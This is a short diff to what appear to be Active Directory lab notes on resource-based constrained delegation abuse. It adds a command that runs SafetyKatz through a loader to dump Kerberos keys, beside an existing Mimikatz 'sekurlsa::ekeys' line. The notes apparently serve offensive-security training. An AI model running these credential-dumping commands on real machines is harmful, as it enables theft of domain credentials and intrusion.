@@ -25,8 +25,10 @@ Confirm RBCD configuration
 Get-DomainRBCD
 ```
 
-Obtain foothold/attacker machine machine hash (`dcorp-student548$`)
+Obtain foothold/attacker machine machine hash (`dcorp-student548$`) - SID `S-1-5-18`
 ```powershell
+Loader.exe -path .\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
+
 Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 ```
 
